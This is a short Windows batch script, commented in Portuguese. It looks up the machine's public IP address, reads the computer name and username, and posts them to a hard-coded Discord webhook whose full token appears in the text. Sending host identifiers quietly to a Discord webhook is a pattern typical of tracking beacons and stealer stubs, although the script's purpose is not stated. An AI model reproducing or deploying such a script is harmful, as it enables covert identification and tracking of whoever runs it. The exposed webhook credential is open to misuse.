@echo off
setlocal

:: Pega IP público
for /f %%A in ('curl -s https://api.ipify.org') do set IP=%%A

:: Debug (opcional – pode apagar depois)
echo IP=%IP%
pause

set PC=%COMPUTERNAME%
set USER=%USERNAME%

set MESSAGE=PC %PC% - Usuario %USER% - IP publico %IP%

curl -s ^
-H "Content-Type: application/json" ^
-X POST ^
-d "{\"content\":\"%MESSAGE%\"}" ^
https://discord.com/api/webhooks/1476889854296981637/-KRgTWFBVNLoiII8EPfnGZDivUtmerZR7Zr-NAhDJ3BkERuuXPW818ug_I-o5xak71OK

endlocal
